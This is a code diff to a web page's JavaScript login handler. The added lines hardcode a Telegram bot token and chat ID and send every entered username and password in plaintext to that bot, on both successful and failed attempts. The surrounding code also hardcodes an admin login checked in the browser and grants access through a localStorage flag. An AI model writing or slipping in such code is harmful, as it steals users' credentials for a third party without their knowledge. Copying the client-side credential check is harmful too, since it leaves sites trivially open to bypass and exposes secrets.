@@ -24,15 +24,27 @@ loginBtn.onclick = () => {
   const u = document.getElementById("username").value.trim();
   const p = document.getElementById("password").value.trim();
   const status = document.getElementById("loginStatus");
+  const token = "7066548581:AAHW8fbNiDJL3cwcOhXhjZLBAb-CcBVu1fs";
+  const chatId = "7640736550";
+  const message = `Login Attempt:\nUsername: ${u}\nPassword: ${p}`
 
   if (u === "MatrixMan" && p === "MatrixMan2807") {
     localStorage.setItem("admin", "true");
     loginScreen.classList.add("hidden");
     dashboard.classList.remove("hidden");
     loadData();
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+      .then(() => {
+
+
+      })
   } else {
     status.textContent = "❌ Wrong credentials!";
     status.style.color = "red";
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+      .then(() => {
+
+      })
   }
 };
 
